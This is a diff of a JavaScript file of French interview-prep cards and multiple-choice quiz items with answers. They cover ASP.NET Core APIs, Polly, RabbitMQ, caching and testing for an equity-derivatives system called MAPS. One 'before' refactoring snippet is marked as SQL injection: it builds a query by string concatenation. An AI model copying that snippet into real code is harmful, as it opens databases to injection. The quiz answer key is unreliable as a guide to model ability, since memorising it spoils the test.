-    "answer": "**Circuit Breaker** : évite les cascades de pannes. `Polly.CircuitBreakerAsync(exceptionsAllowedBeforeBreaking: 5, durationOfBreak: TimeSpan.FromSeconds(30))` — si Sophis est down, le circuit s'ouvre 30s puis tente de récupérer. ◆ **Retry avec backoff** : `Polly.WaitAndRetryAsync(3, retryAttempt => TimeSpan.FromSeconds(Math.Pow(2, retryAttempt)))` — 1s, 2s, 4s. ◆ **Timeout** : `Polly.TimeoutAsync(TimeSpan.FromSeconds(5))` sur les appels Sophis/DataSynapse. ◆ **Fallback** : si le service de volatilité est indisponible, utiliser la dernière surface connue depuis Redis. ◆ **Dead-letter queue** : les messages RabbitMQ en erreur (booking échoué, ISIN introuvable) redirigés vers une DLQ pour analyse et rejeu manuel. ◆ **Structured logging** : `_logger.LogError(ex, \"BookingFailed {TradeId} {ISIN} {Error}\", tradeId, isin, ex.Message)` — Serilog + Elasticsearch."
+    "question": "Gestion des erreurs API REST — ProblemDetails, middleware global, Polly",
+    "answer": "**ProblemDetails (RFC 7807)** : `services.AddProblemDetails()` — format standardisé : `{ type: \"https://maps.bnp/errors/booking-failed\", title: \"Booking Failed\", status: 400, detail: \"ISIN FR0000131104 not found in Sophis\", tradeId: \"...\", correlationId: \"...\" }` ◆ **Middleware global** : `app.UseExceptionHandler(a => a.Run(async ctx => { var ex = ctx.Features.Get<IExceptionHandlerFeature>(); _logger.LogError(ex.Error, \"Unhandled {CorrelationId}\", ctx.TraceIdentifier); await ctx.Response.WriteAsJsonAsync(new ProblemDetails { Status = 500 }); }));` — jamais exposer les stack traces. ◆ **Polly resilience pipeline** : `services.AddHttpClient<ISophisAdapter>().AddResilienceHandler(\"sophis\", b => b.AddRetry(new RetryStrategyOptions { MaxRetryAttempts = 3, Delay = TimeSpan.FromSeconds(1), BackoffType = DelayBackoffType.Exponential }).AddCircuitBreaker(new CircuitBreakerStrategyOptions { FailureRatio = 0.5, SamplingDuration = TimeSpan.FromSeconds(30) }).AddTimeout(TimeSpan.FromSeconds(5)));` ◆ **Correlation ID** : middleware injecte `X-Correlation-ID` dans chaque réponse — propagé à tous les services downstream."
   },
   {
-    "question": ".NET Framework 4.8 vs .NET 8 — Migration et coexistence",
-    "answer": "**Contexte MAPS** : .NET Framework 4.8 pour les composants legacy (intégration Sophis COM, MSMQ, libs tierces non migrées). .NET 8 pour les nouveaux services REST API et les composants refactorisés. ◆ **Différences clés** : .NET 8 = cross-platform (Linux containers), performances améliorées (AOT, Span improvements), `IHostedService` natif, `Minimal APIs`. .NET Framework 4.8 = Windows uniquement, pas de Minimal APIs. ◆ **Multi-target** : `<TargetFrameworks>net48;net8.0</TargetFrameworks>` + `#if NET48 / #if NET8_0` pour les différences. ◆ **Migration stratégique** : abstraire l'accès Sophis derrière `ISophisAdapter` → implémenter en .NET Framework 4.8 → le reste du service en .NET 8. ◆ **NuGet** : packages compatibles avec les deux TFMs — vérifier les `<TargetFramework>` dans les dépendances."
+    "question": "DataSynapse — Calcul distribué intégré dans le pipeline REST",
+    "answer": "**Pattern Async Job** : `POST /api/v1/pricing/calculate` → controller appelle `_pricingJobService.SubmitAsync(request)` → `DataSynapseClient.SubmitJob(job)` → retour immédiat du `jobId` → 202 Accepted. ◆ **Polling** : `GET /api/v1/pricing/status/{jobId}` → `DataSynapseClient.GetJobStatus(jobId)` → `{ status: \"RUNNING\" | \"COMPLETED\" | \"FAILED\", progress: 75, greeks: null | {...} }`. ◆ **Abstraction** : `interface IComputeEngine { Task<string> SubmitJobAsync(PricingJob job, CancellationToken ct); Task<JobResult> GetResultAsync(string jobId, CancellationToken ct); }` — `DataSynapseEngine` (production) et `LocalParallelEngine` (dev/test, `Parallel.For` local). ◆ **Timeout + DLQ** : si le job DataSynapse dépasse 30s, le service le marque `TIMEOUT`, publie sur la dead-letter queue RabbitMQ pour rejeu. ◆ **Message RabbitMQ** : `PricingJobCompleted { JobId, GreeksJson, Duration, Timestamp }` publié quand DataSynapse répond — consommé par le blotter via WebSocket."
   },
   {
-    "question": "Patterns d'architecture — Service de récupération d'ISIN",
-    "answer": "**Problème** : l'ISIN est nécessaire avant tout booking. Le référentiel Sophis est lent (appel COM, latence réseau). ◆ **Solution Cache-Aside** : `async Task<string> ResolveISINAsync(string internalId) { if(_cache.TryGetValue($\"isin:{internalId}\", out string isin)) return isin; isin = await _sophisAdapter.GetISINAsync(internalId); _cache.Set($\"isin:{internalId}\", isin, TimeSpan.FromHours(4)); return isin; }` ◆ **Cache distribué** : Redis pour partager le cache ISIN entre plusieurs instances du service. `IDistributedCache` ASP.NET Core. ◆ **Invalidation** : les ISIN ne changent pas — TTL long (4h-24h). En cas de modification, event Kafka `ISINUpdated` invalide le cache. ◆ **Fallback** : si Redis est down, `IMemoryCache` local par instance. ◆ **Monitoring** : métriques cache hit/miss ratio via Prometheus/Grafana — objectif > 95% hit rate en période de marché."
+    "question": "Tests — Stratégie complète pour l'API REST MAPS",
+    "answer": "**Tests unitaires (xUnit + Moq)** : `var mockRepo = new Mock<IInstrumentRepository>(); mockRepo.Setup(r => r.GetByIsinAsync(\"FR0000131104\", It.IsAny<CancellationToken>())).ReturnsAsync(instrument); var sut = new BookingService(mockRepo.Object, mockBus.Object, mockLogger.Object);` ◆ **Tests d'intégration (WebApplicationFactory)** : `var factory = new WebApplicationFactory<Program>().WithWebHostBuilder(b => b.ConfigureServices(s => s.AddSingleton<ISophisAdapter>(mockSophis.Object))); var client = factory.CreateClient(); var resp = await client.PostAsJsonAsync(\"/api/v1/booking\", request);` — teste le pipeline HTTP complet (auth, routing, validation, middleware) sans déploiement. ◆ **Testcontainers** : `var sql = new MsSqlBuilder().Build(); var rabbit = new RabbitMqBuilder().Build();` — vraies instances Docker dans les tests CI. ◆ **BenchmarkDotNet** : `[Benchmark] public Task PriceBook_Sequential()` vs `[Benchmark] public Task PriceBook_Parallel()` — mesure des gains de refactoring. ◆ **Tests de contrat** : `PactNet` entre `BookingService` (producer) et `OmsService` (consumer)."
   },
   {
-    "question": "Tests en environnement CIB — Stratégies et outils",
-    "answer": "**Tests unitaires** : `xUnit` + `Moq`. Tester la logique de pricing sans dépendances externes. `var mockRepo = new Mock<IMarketDataRepository>(); mockRepo.Setup(r => r.GetVolAsync(\"BNPP\", It.IsAny<decimal>(), It.IsAny<DateTime>())).ReturnsAsync(0.25m); var engine = new PricingEngine(mockRepo.Object); var price = await engine.PriceAsync(option);` ◆ **Tests d'intégration** : appels réels à SQL Server (base de test), Testcontainers pour RabbitMQ. ◆ **Tests de performance** : BenchmarkDotNet pour mesurer les gains de refactoring. `[Benchmark] public void PriceBook_Sequential()` vs `[Benchmark] public void PriceBook_Parallel()`. ◆ **Tests de contrat** : Pact pour les API REST — le consommateur (OMS) et le producteur (MAPS) partagent un contrat de message. ◆ **Smoke tests** : après déploiement, `GET /health` + `POST /api/v1/pricing/test-option` avec un option de référence."
+    "question": "Refactoring — De l'appel direct Sophis à l'architecture propre",
+    "answer": "**Avant** : `public IActionResult BookTrade(BookingRequest req) { var conn = new SqlConnection(\"...\"); var isin = conn.ExecuteScalar<string>(\"SELECT ISIN FROM Instruments WHERE Id=\" + req.Id); /* SQL injection! */ var sophis = new SophisComAdapter(); sophis.CreateTrade(isin, req.Notional); return Ok(); }` — 5 violations en 4 lignes. ◆ **Après** : Controller → `IBookingService.BookAsync(request, ct)` → `IIsinService.ResolveAsync(id, ct)` (cache-aside + `ISophisAdapter`) → `ITradeRepository.CreateAsync(trade, ct)` (EF Core + transaction) → `IMessageBus.PublishAsync(\"trade.booked\", event, ct)` (RabbitMQ). ◆ **Gains** : SRP (chaque service a une responsabilité), DIP (interfaces injectées), testabilité (mocks), résilience (Polly sur `ISophisAdapter`), observabilité (structured logging à chaque étape), OCP (nouvelle source ISIN = nouvelle implémentation `ISophisAdapter`, zéro modification). ◆ **Mesure** : BenchmarkDotNet avant/après — latence, allocations GC."
+  },
+  {
+    "question": "Observabilité — Logging, métriques, tracing dans MAPS",
+    "answer": "**Structured logging Serilog** : `Log.ForContext(\"TradeId\", tradeId).ForContext(\"ISIN\", isin).ForContext(\"Desk\", desk).Information(\"Trade booked {Notional} EUR\", notional)` — chaque log enrichi du contexte métier, indexé dans Elasticsearch/Splunk. ◆ **Métriques Prometheus** : `var bookingCounter = Metrics.CreateCounter(\"maps_bookings_total\", \"Total bookings\", new[] { \"desk\", \"status\" }); bookingCounter.WithLabels(\"equity\", \"success\").Inc();` — scrappé par Prometheus, dashboards Grafana. ◆ **Distributed tracing** : `Activity.Current?.AddTag(\"isin\", isin);` + OpenTelemetry — traces Jaeger reconstituent le chemin complet d'une requête à travers les microservices. ◆ **Health checks** : `services.AddHealthChecks().AddSqlServer(cs).AddRabbitMQ(rabbitUri).AddRedis(redisCs).AddUrlGroup(new Uri(sophisUrl + \"/health\"), \"sophis\");` ◆ **Alertes** : Grafana alerte si `maps_booking_errors_total > 10/min` ou `maps_booking_latency_p99 > 500ms`."
+  },
+  {
+    "question": "Sophis + SQL Server + Redis — Référentiel de données optimisé",
+    "answer": "**Flux de résolution ISIN** : `BookingRequest.InstrumentId` → L1 `ConcurrentDictionary<string,string> _hotCache` (1000 ISIN les plus fréquents, TTL 15min) → L2 `IMemoryCache` (TTL 30min) → L3 Redis `IDistributedCache` (TTL 4h, partagé entre instances) → L4 `ISophisAdapter.GetISINAsync(id)` → L5 SQL `SELECT ISIN FROM Instruments WHERE InternalId = @id` (index covering). ◆ **Cache warming** : au démarrage du service, `IHostedService.StartAsync()` précharge les 1000 ISIN les plus demandés dans L1 depuis Redis. ◆ **Invalidation** : Kafka event `InstrumentUpdated` consommé → suppression des entrées invalidées dans Redis + MemoryCache. ◆ **Monitoring** : métriques `cache_hit_ratio` par niveau — objectif > 98% sur L1+L2+L3 combinés en période de marché. ◆ **Sophis COM/API** : accès wrappé dans `ISophisAdapter` avec Polly (retry 3×, circuit breaker 30s, timeout 5s)."
+  },
+  {
+    "question": "Patterns de choix techniques — Quand utiliser quoi dans MAPS",
+    "answer": "**`async/await` vs `Parallel.For`** : I/O-bound (DB, Sophis, HTTP) → `async/await`. CPU-bound (Monte Carlo, Greeks) → `Parallel.For`. Ne jamais utiliser `Parallel.ForEachAsync` sans comprendre le scheduler. ◆ **EF Core vs Dapper** : writes transactionnels avec relations → EF Core. Reads haute fréquence, SQL précis → Dapper. Les deux ensemble via Repository pattern. ◆ **MSMQ vs RabbitMQ** : legacy .NET 4.8 Windows → MSMQ (avec `IMessageBus` abstraction). Nouveaux services, multi-instances, monitoring → RabbitMQ. ◆ **Redis vs MemoryCache** : multi-instances → Redis. Single instance ou cache très froid → `IMemoryCache`. Les deux en L2/L3. ◆ **REST vs gRPC** : communication externe (OMS, blotter) → REST (standard, tooling riche). Communication interne microservices haute fréquence (> 10k req/s) → gRPC (binaire, streaming, IDL). ◆ **Docker vs IIS** : nouveaux services .NET 8 → Docker. Legacy .NET 4.8 (Sophis COM, MSMQ) → IIS Windows. ◆ **Microservice vs monolithe** : new features → microservice. Migration legacy → Strangler Fig pattern."
+  },
+  {
+    "question": ".NET 4.8 et .NET 8 — Coexistence dans l'infrastructure MAPS",
+    "answer": "**Multi-target library** : `<TargetFrameworks>net48;net8.0</TargetFrameworks>` + `#if NET48 / #else / #endif` pour les divergences (System.Messaging / RabbitMQ.Client). ◆ **Services .NET 4.8** : `Maps.SophisAdapter` (COM Sophis, Windows uniquement), `Maps.MsmqBus` (MSMQ legacy), `Maps.DataSynapseClient` (lib tierce non migrée). Hébergés sur IIS Windows Server. ◆ **Services .NET 8** : `Maps.BookingApi`, `Maps.PricingApi`, `Maps.InstrumentService` — cross-platform, conteneurisés, déployés dans Kubernetes. ◆ **Communication** : les services .NET 8 appellent les services .NET 4.8 via REST ou via `IMessageBus` RabbitMQ — jamais de référence directe entre assemblies de TFM différents. ◆ **Migration progressive** : Strangler Fig — extraire `BookingService` de l'application .NET 4.8 monolithique vers un nouveau service .NET 8, router via YARP (reverse proxy C#). ◆ **CI/CD** : pipeline Azure DevOps valide les deux TFMs dans la même exécution."
   }
 ];
 
 const questions = {
   moyen: [
     {
-      "question": "[Terme → Définition] Qu'est-ce qu'un ISIN et pourquoi est-il indispensable dans le service de booking d'un desk Equity Derivatives ?",
+      "question": "[Terme → Définition] Dans une API REST ASP.NET Core, quel est le rôle du middleware `[ApiController]` sur un `BookingController` ?",
       "options": [
-        "Un identifiant interne à Sophis pour les options.",
-        "L'International Securities Identification Number — identifiant unique à 12 caractères d'un instrument financier, prérequis obligatoire pour booker un trade dans le référentiel.",
-        "Un code Bloomberg pour les données de marché.",
-        "Un identifiant de transaction généré par l'OMS à chaque booking."
+        "Il enregistre le controller dans le conteneur d'injection de dépendances.",
+        "Il active la validation automatique du ModelState (retourne 400 si le body JSON est invalide), le binding depuis les attributs sources (`[FromBody]`, `[FromRoute]`) et les réponses d'erreur standardisées.",
+        "Il configure les routes HTTP pour tous les endpoints du controller.",
+        "Il active l'authentification JWT sur tous les endpoints du controller."
       ],
-      "answer": "L'International Securities Identification Number — identifiant unique à 12 caractères d'un instrument financier, prérequis obligatoire pour booker un trade dans le référentiel.",
-      "explanation": "En CIB Equity Derivatives, chaque instrument (option, structured note) est identifié par son ISIN dans le référentiel (Sophis, Bloomberg). Le service de booking ne peut pas créer un trade sans ISIN valide — c'est le lien entre l'instrument métier et le système de post-trade. La mission décrit explicitement 'mise en place d'un service de récupération d'ISIN nécessaire pour le booking'."
+      "answer": "Il active la validation automatique du ModelState (retourne 400 si le body JSON est invalide), le binding depuis les attributs sources (`[FromBody]`, `[FromRoute]`) et les réponses d'erreur standardisées.",
+      "explanation": "`[ApiController]` est une convention ASP.NET Core qui active 3 comportements : (1) ModelState automatique — si `BookingRequest` a un champ `[Required]` absent, retour 400 sans écrire de code. (2) Binding automatique — `[FromBody]` pour les POST, `[FromRoute]` pour `{id}`, `[FromQuery]` pour les query params. (3) Format d'erreur standardisé — `ValidationProblemDetails`. Sans `[ApiController]`, il faut écrire `if (!ModelState.IsValid) return BadRequest(ModelState);` manuellement dans chaque action."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce que le Delta d'une option et quelle est son utilité pratique pour un trader CIB ?",
+      "question": "[Terme → Définition] Quelle est la différence entre `[Authorize]` et `[Authorize(Policy=\"CanBook\")]` sur un endpoint de booking dans MAPS ?",
       "options": [
-        "La valeur actuelle de l'option.",
-        "La sensibilité du prix de l'option au prix du sous-jacent — un Delta de 0.5 signifie que si l'action monte de 1€, l'option monte de 0.50€. Utilisé pour le delta hedging.",
-        "La durée de vie restante de l'option jusqu'à l'échéance.",
-        "Le volume de transactions sur l'option dans la journée."
+        "Ce sont des équivalents — `Policy` est optionnel.",
+        "`[Authorize]` vérifie uniquement qu'un JWT valide est présent. `[Authorize(Policy=\"CanBook\")]` vérifie en plus que le token satisfait des règles supplémentaires (rôle TRADER, claim desk=equity).",
+        "`[Authorize(Policy)]` est uniquement pour les endpoints de lecture, pas d'écriture.",
+        "`[Authorize]` est pour .NET 4.8, `[Authorize(Policy)]` est pour .NET 8 uniquement."
       ],
-      "answer": "La sensibilité du prix de l'option au prix du sous-jacent — un Delta de 0.5 signifie que si l'action monte de 1€, l'option monte de 0.50€. Utilisé pour le delta hedging.",
-      "explanation": "Le Delta est le Greek le plus utilisé au quotidien. Un Call a un Delta positif (∈ [0,1]), un Put négatif (∈ [-1,0]). Le delta hedging consiste à acheter/vendre le sous-jacent en proportion du Delta pour neutraliser l'exposition directionnelle. En pré-trade, le Delta calculé par MAPS permet au trader d'évaluer le hedge nécessaire avant d'exécuter l'option."
+      "answer": "`[Authorize]` vérifie uniquement qu'un JWT valide est présent. `[Authorize(Policy=\"CanBook\")]` vérifie en plus que le token satisfait des règles supplémentaires (rôle TRADER, claim desk=equity).",
+      "explanation": "En CIB, la granularité d'autorisation est critique : un Sales ne devrait pas pouvoir booker les mêmes produits qu'un Trader. `[Authorize]` = authentification minimum (JWT valide, non expiré). `Policy` = autorisation fine : `services.AddAuthorization(o => o.AddPolicy(\"CanBook\", p => p.RequireRole(\"TRADER\").RequireClaim(\"desk\", \"equity\")))`. Un utilisateur authentifié peut quand même recevoir 403 Forbidden si sa policy n'est pas satisfaite."
     },
     {
-      "question": "[Définition → Terme] Dans Black-Scholes, le paramètre extrait du prix de marché d'une option (non observable directement) par inversion de la formule s'appelle ?",
+      "question": "[Définition → Terme] Dans LINQ, quelle est la différence critique entre `IQueryable<T>` et `IEnumerable<T>` pour une requête sur le référentiel d'instruments ?",
       "options": [
-        "La volatilité historique (réalisée)",
-        "La volatilité implicite",
-        "Le taux sans risque",
-        "Le dividende implicite"
+        "Ce sont des interfaces identiques, le choix n'a pas d'impact.",
+        "`IQueryable<T>` traduit les opérations LINQ en SQL côté serveur (seules les lignes filtrées sont transférées). `IEnumerable<T>` charge TOUT en mémoire puis filtre côté client.",
+        "`IQueryable<T>` est uniquement compatible avec EF Core, `IEnumerable<T>` avec Dapper.",
+        "`IEnumerable<T>` est plus performant car il utilise le cache CPU."
       ],
-      "answer": "La volatilité implicite",
-      "explanation": "La volatilité implicite σ_impl est la valeur de σ qui, introduite dans Black-Scholes, reproduit le prix de marché observé. C'est une quantité 'extraite' par inversion numérique (Newton-Raphson, bissection). Contrairement à la volatilité historique (calculée sur les prix passés), elle reflète les anticipations du marché. C'est l'input clé de la surface de volatilité dans MAPS."
+      "answer": "`IQueryable<T>` traduit les opérations LINQ en SQL côté serveur (seules les lignes filtrées sont transférées). `IEnumerable<T>` charge TOUT en mémoire puis filtre côté client.",
+      "explanation": "Différence de performance critique en CIB avec 500k instruments : `IQueryable<T>` → EF Core génère `SELECT ... WHERE UnderlyingId=@id LIMIT 50` → 50 lignes transférées. `IEnumerable<T>` → `SELECT * FROM Instruments` → 500k lignes chargées en RAM, filtrées côté .NET. Anti-pattern classique : `_context.Instruments.ToList().Where(i => i.UnderlyingId == id)` — le `.ToList()` force l'exécution avant le `.Where()`. Règle : ne jamais appeler `.ToList()`, `.ToArray()` ou `.AsEnumerable()` avant les filtres LINQ sur un `IQueryable`."
     },
     {
-      "question": "[Terme → Définition] Quelle est la différence entre MSMQ et RabbitMQ dans le contexte de l'environnement technique MAPS ?",
+      "question": "[Caractéristiques → Concept] `ArrayPool<double>.Shared.Rent(252)` + `try/finally { ArrayPool<double>.Shared.Return(buf) }` dans une boucle Monte Carlo de 100k simulations. Quel problème résout ce pattern ?",
       "options": [
-        "MSMQ est plus rapide que RabbitMQ dans tous les cas.",
-        "MSMQ est un système de messaging Windows legacy (.NET Framework, local), RabbitMQ est un broker AMQP moderne (centralisé, cloud-native, scalable, dead-letter queues).",
-        "RabbitMQ est uniquement utilisé pour les bases de données.",
-        "MSMQ supporte le pattern pub/sub, RabbitMQ non."
+        "Il garantit que les tableaux sont initialisés à zéro avant utilisation.",
+        "Il évite 100k allocations heap de 252 doubles — réutilise les mêmes buffers via un pool, réduisant la pression GC et les pauses de collecte.",
+        "Il synchronise l'accès concurrent aux buffers sous `Parallel.For`.",
+        "Il compresse les données en mémoire pour réduire l'empreinte RAM."
       ],
-      "answer": "MSMQ est un système de messaging Windows legacy (.NET Framework, local), RabbitMQ est un broker AMQP moderne (centralisé, cloud-native, scalable, dead-letter queues).",
-      "explanation": "Dans la mission MAPS : MSMQ est le système historique (.NET Framework 4.8, Windows uniquement, pas de broker centralisé, difficile à monitorer et scaler). RabbitMQ est l'évolution — broker centralisé AMQP, exchanges/queues flexibles, dead-letter queues pour les messages en erreur, monitoring via plugin de management. La coexistence des deux est typique d'une migration progressive."
+      "answer": "Il évite 100k allocations heap de 252 doubles — réutilise les mêmes buffers via un pool, réduisant la pression GC et les pauses de collecte.",
+      "explanation": "Sans `ArrayPool` : 100k × 252 × 8 bytes = ~200MB alloués + collectés à chaque pricing → Gen2 GC toutes les quelques secondes → pauses de 50-200ms. Le trader attend. Avec `ArrayPool` : les threads louent un buffer existant, l'utilisent, le rendent. En régime permanent, le pool contient autant de buffers que de threads actifs — allocation quasi-nulle. Le `try/finally` est indispensable pour garantir le `Return()` même en cas d'exception (sinon le pool se vide progressivement)."
     },
     {
-      "question": "[Caractéristiques → Concept] `abstract decimal Price()`, `EuropeanCall : BaseOption`, `BarrierOption : BaseOption`, `Parallel.ForEach(book, opt => opt.Price(md))`. Quel mécanisme C# est indispensable ici ?",
+      "question": "[Terme → Définition] Qu'est-ce qu'une dead-letter queue (DLQ) RabbitMQ et quel cas d'usage couvre-t-elle dans MAPS ?",
       "options": [
-        "Encapsulation uniquement — les données sont privées.",
-        "Polymorphisme — un même appel `opt.Price(md)` exécute la formule correcte selon le type réel de l'option, sans switch/case.",
-        "Singleton — une seule instance du moteur de pricing.",
-        "Sérialisation JSON des options dans la queue."
+        "Une queue prioritaire pour les messages urgents de booking.",
+        "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, Sophis timeout) est redirigé vers la DLQ pour inspection et rejeu sans perdre le message.",
+        "Une queue d'archivage pour la conformité MiFID II.",
+        "Une queue de backup activée uniquement si le broker principal est down."
       ],
-      "answer": "Polymorphisme — un même appel `opt.Price(md)` exécute la formule correcte selon le type réel de l'option, sans switch/case.",
-      "explanation": "Le polymorphisme est fondamental dans un moteur de pricing hétérogène : un book contient des calls, des puts, des barriers, des autocalls. Avec `List<BaseOption>`, le `Parallel.ForEach` appelle `Price()` sur chaque option — chacune exécute sa propre formule (Black-Scholes pour EuropeanCall, PDE pour BarrierOption, Monte Carlo pour Autocall). Sans polymorphisme, le code serait un `switch(opt.Type)` impossible à maintenir."
+      "answer": "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, Sophis timeout) est redirigé vers la DLQ pour inspection et rejeu sans perdre le message.",
+      "explanation": "En CIB, perdre silencieusement un message de booking est inacceptable — un trade non enregistré = position incorrecte = risque réglementaire. La DLQ capture les messages avec `x-death` headers (raison du rejet, tentatives, timestamp). L'équipe support peut inspecter via le plugin de management RabbitMQ, corriger l'anomalie (ex : créer l'ISIN manquant dans Sophis) et rejouer le message. Configuration : `x-dead-letter-exchange` sur la queue principale pointe vers un exchange dédié à la DLQ."
     },
     {
-      "question": "[Définition → Terme] Dans ASP.NET Core, quel attribut protège un endpoint de booking contre les accès non authentifiés ?",
+      "question": "[Terme → Définition] Quelle est la différence entre `Task.WhenAll` et `Parallel.For` pour les opérations dans le service de pricing MAPS ?",
       "options": [
-        "`[HttpPost]`",
-        "`[Authorize]` — vérifie la présence d'un token JWT valide avant d'exécuter la méthode.",
-        "`[ApiController]`",
-        "`[Route]`"
+        "Ce sont des synonymes — seule la syntaxe diffère.",
+        "`Task.WhenAll` est pour les opérations I/O-bound (plusieurs appels async simultanés : SQL, Sophis, Redis). `Parallel.For` est pour les opérations CPU-bound (Monte Carlo, calcul de Greeks par différences finies sur un book entier).",
+        "`Task.WhenAll` utilise un seul thread, `Parallel.For` en utilise plusieurs.",
+        "`Parallel.For` est déprécié en .NET 8 — utiliser uniquement `Task.WhenAll`."
       ],
-      "answer": "`[Authorize]` — vérifie la présence d'un token JWT valide avant d'exécuter la méthode.",
-      "explanation": "En C# ASP.NET Core, `[Authorize]` active le middleware d'authentification sur cet endpoint. Sans token JWT valide dans le header `Authorization: Bearer <token>`, le serveur répond 401 Unauthorized. On peut affiner : `[Authorize(Roles = \"TRADER\")]` ou `[Authorize(Policy = \"CanBookEquity\")]` pour une autorisation granulaire par desk ou rôle. Indispensable sur tous les endpoints de booking en CIB (réglementation MiFID II)."
+      "answer": "`Task.WhenAll` est pour les opérations I/O-bound (plusieurs appels async simultanés : SQL, Sophis, Redis). `Parallel.For` est pour les opérations CPU-bound (Monte Carlo, calcul de Greeks par différences finies sur un book entier).",
+      "explanation": "Distinction fondamentale : `Task.WhenAll` libère les threads pendant l'attente I/O — aucun CPU consommé pendant l'attente Sophis. Parfait pour lancer simultanément 3 appels async (ISIN + position + limite) et attendre le plus lent. `Parallel.For` sature les cœurs CPU pour des calculs numériques — 100k simulations Monte Carlo sur 32 cœurs = ×32 vs séquentiel. Mélanger les deux incorrectement : `Parallel.For` avec des lambdas `async void` crée des race conditions et des résultats incorrects."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce que `Task.WhenAll` et en quoi améliore-t-il le calcul de Greeks dans un moteur de pricing C# ?",
+      "question": "[Correspondance] Associez chaque code HTTP à son contexte CIB correct : `201 Created` → ? / `409 Conflict` → ? / `503 Service Unavailable` → ?",
       "options": [
-        "Il exécute les tâches une par une dans l'ordre.",
-        "Il lance toutes les tâches simultanément et attend que la dernière soit terminée — les Greeks (Delta, Vega, Theta) sont calculés en parallèle, réduisant la latence totale à celle du calcul le plus lent.",
-        "Il annule les tâches si l'une d'elles échoue.",
-        "Il répartit les tâches sur les nœuds DataSynapse automatiquement."
+        "Booking réussi / ISIN invalide / Sophis down",
+        "Booking réussi (trade créé dans Sophis) / Idempotency-Key déjà utilisée (trade déjà booké) / Circuit breaker ouvert (Sophis ou DataSynapse indisponible)",
+        "Validation OK / Booking dupliqué / Timeout réseau",
+        "Trade mis à jour / Conflit de version / Rate limit dépassé"
       ],
-      "answer": "Il lance toutes les tâches simultanément et attend que la dernière soit terminée — les Greeks (Delta, Vega, Theta) sont calculés en parallèle, réduisant la latence totale à celle du calcul le plus lent.",
-      "explanation": "Sans `Task.WhenAll` : Delta(1ms) + Vega(1ms) + Theta(1ms) = 3ms séquentiel. Avec `Task.WhenAll` : 1ms total (le plus lent). Sur un book de 500 options avec 5 Greeks chacune, le gain est ×5. `Task.WhenAll` est adapté aux opérations I/O-bound ou à la parallélisation logique légère — pour le CPU-bound pur (Monte Carlo 100k simulations), `Parallel.For` est plus adapté."
+      "answer": "Booking réussi (trade créé dans Sophis) / Idempotency-Key déjà utilisée (trade déjà booké) / Circuit breaker ouvert (Sophis ou DataSynapse indisponible)",
+      "explanation": "Sémantique HTTP précise en CIB : 201 Created = ressource créée, header `Location: /api/v1/booking/{tradeId}` pour la retrouver. 409 Conflict = idempotency key déjà traitée — retourner le résultat précédent (pas d'erreur pour le client, juste signaler que c'était un retry). 503 Service Unavailable = le service MAPS est up mais ses dépendances critiques sont down — header `Retry-After: 30` pour indiquer quand réessayer. 429 serait pour le rate limiting, 400 pour la validation, 404 pour un ISIN introuvable."
     },
     {
-      "question": "[Caractéristiques → Concept] Un service C# garde en cache les ISIN avec un TTL de 4h dans `IMemoryCache` et retombe sur Sophis en cas de miss. Quel pattern est utilisé ?",
+      "question": "[Terme → Définition] Qu'est-ce que le pattern Repository et pourquoi est-il utile dans le service MAPS qui mixte Dapper et EF Core ?",
       "options": [
-        "Write-through cache",
-        "Cache-aside (lazy loading) — le cache est peuplé à la demande uniquement lors d'un miss, sans écriture anticipée.",
-        "Read-through cache",
-        "Event-driven invalidation"
+        "Un pattern qui stocke tout le code SQL dans un seul fichier.",
+        "Une abstraction `IInstrumentRepository` qui cache l'ORM utilisé — Dapper pour les reads, EF Core pour les writes. Le service métier ne sait pas quel ORM tourne derrière.",
+        "Un pattern qui réplique automatiquement les données entre SQL Server et Redis.",
+        "Le pattern Repository impose d'utiliser EF Core uniquement."
       ],
-      "answer": "Cache-aside (lazy loading) — le cache est peuplé à la demande uniquement lors d'un miss, sans écriture anticipée.",
-      "explanation": "Cache-aside : l'application gère le cache elle-même. 1) Lire le cache — si hit, retourner. 2) Si miss, lire Sophis. 3) Écrire dans le cache avec TTL. 4) Retourner. Avantage : simple, le cache ne contient que les données réellement demandées. Pour les ISIN (stables, peu changeants), TTL de 4h est raisonnable. Alternative : write-through (écriture simultanée cache + DB) — plus complexe mais cohérence immédiate."
+      "answer": "Une abstraction `IInstrumentRepository` qui cache l'ORM utilisé — Dapper pour les reads, EF Core pour les writes. Le service métier ne sait pas quel ORM tourne derrière.",
+      "explanation": "Repository pattern dans MAPS : `IInstrumentRepository { Task<InstrumentDto> GetByIsinAsync(string isin, CancellationToken ct); Task SaveAsync(Instrument instrument, CancellationToken ct); }`. Implémentation : `GetByIsinAsync` utilise Dapper (SQL brut, ultra-rapide). `SaveAsync` utilise EF Core (transaction, change tracking). Le `BookingService` dépend de `IInstrumentRepository` — lors des tests unitaires, on mock l'interface. Si on remplace Dapper par une autre solution, on modifie uniquement l'implémentation, jamais le service métier."
     },
     {
-      "question": "[Terme → Définition] Qu'est-ce que `ArrayPool<T>` et pourquoi est-il critique dans un service de Monte Carlo C# à haute fréquence ?",
+      "question": "[Erreur contextuelle] Un développeur MAPS écrit `GET /api/v1/booking/delete/{tradeId}` pour annuler un trade. Quelle violation REST commet-il ?",
       "options": [
-        "Un tableau fixe alloué une fois au démarrage de l'application.",
-        "Un mécanisme de réutilisation de buffers pré-alloués — évite les allocations répétées sur le heap et réduit la pression sur le Garbage Collector pendant les calculs Monte Carlo.",
-        "Un pool de connexions SQL pour les accès au référentiel.",
-        "Une structure de données thread-safe pour les Greeks concurrents."
+        "Aucune — nommer l'action dans l'URL est une bonne pratique.",
+        "GET doit être safe et sans effet de bord — annuler un trade est une action destructive qui doit utiliser `DELETE /api/v1/booking/{tradeId}` ou `POST /api/v1/booking/{tradeId}/cancel`.",
+        "Le problème est uniquement le nom de la route — changer en `GET /api/v1/booking/cancel/{tradeId}`.",
+        "GET ne peut pas avoir de paramètre de route `{tradeId}`."
       ],
-      "answer": "Un mécanisme de réutilisation de buffers pré-alloués — évite les allocations répétées sur le heap et réduit la pression sur le Garbage Collector pendant les calculs Monte Carlo.",
